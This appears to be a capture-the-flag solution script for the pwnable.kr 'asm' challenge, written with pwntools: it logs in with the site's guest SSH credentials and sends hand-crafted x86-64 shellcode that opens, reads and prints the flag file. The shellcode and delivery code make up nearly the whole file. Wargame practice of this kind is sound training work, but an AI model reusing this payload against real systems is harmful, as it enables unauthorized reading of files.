"""
pwnable.kr-asm solution
author: Weston Silbaugh
"""
from pwn import *

def main():
	#hand crafted shellcode
	#its not pretty but she works
	shellcode = "\xeb\x40\x48\x31\xc0\x5b\x53\x66\x81\xc3\xe7\x00\x67\x89\x03\x04\x02\x5f\x57\x48\x31\xf6\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xc0\x5e\x56\x66\x81\xc2\x90\x01\x0f\x05\x31\xc0\x04\x01\x48\x31\xff\x48\x83\xc7\x01\x5e\x0f\x05\x48\x31\xc0\x48\x31\xff\x04\x3c\x0f\x05\xe8\xbb\xff\xff\xff\x74\x68\x69\x73\x5f\x69\x73\x5f\x70\x77\x6e\x61\x62\x6c\x65\x2e\x6b\x72\x5f\x66\x6c\x61\x67\x5f\x66\x69\x6c\x65\x5f\x70\x6c\x65\x61\x73\x65\x5f\x72\x65\x61\x64\x5f\x74\x68\x69\x73\x5f\x66\x69\x6c\x65\x2e\x73\x6f\x72\x72\x79\x5f\x74\x68\x65\x5f\x66\x69\x6c\x65\x5f\x6e\x61\x6d\x65\x5f\x69\x73\x5f\x76\x65\x72\x79\x5f\x6c\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x6e\x67\x61\x61"

	#connect and send shellcode
	con = ssh(host='pwnable.kr', port=2222, user='asm', password='guest')
	r = con.connect_remote('localhost', 9026)

	r.recvuntil('shellcode:')
	r.send(shellcode)

	#get our flag and print any additional text from service
	out = r.recvline(timeout=0.5)
	while(len(out) > 0):
		print(out)
		out = r.recvline(timeout=0.5)

if __name__ == '__main__':
	main()